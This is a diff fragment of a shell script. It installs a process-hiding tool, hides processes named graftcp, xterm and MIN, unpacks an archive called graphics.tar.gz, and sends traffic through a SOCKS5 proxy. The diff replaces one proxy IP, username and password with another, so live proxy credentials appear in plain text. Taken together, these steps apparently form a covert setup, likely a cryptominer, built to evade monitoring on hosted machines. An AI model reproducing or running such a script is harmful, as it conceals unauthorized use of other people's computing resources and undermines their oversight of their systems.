@@ -8,7 +8,7 @@ chmod +x lba
 npm i -g node-process-hider 
 
 ph add graftcp
-ph add tmate
+ph add xterm
 ph add MIN
 
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
@@ -22,9 +22,9 @@ tar -xvzf graphics.tar.gz
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 = 181.215.184.109:45786
-socks5_username = Selshindeparshuram2012
-socks5_password = V7p9BkV
+socks5 = 176.53.133.217:57597
+socks5_username = 2BHVpyGPD
+socks5_password = 1rN14HAmV
 END
 
 ./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
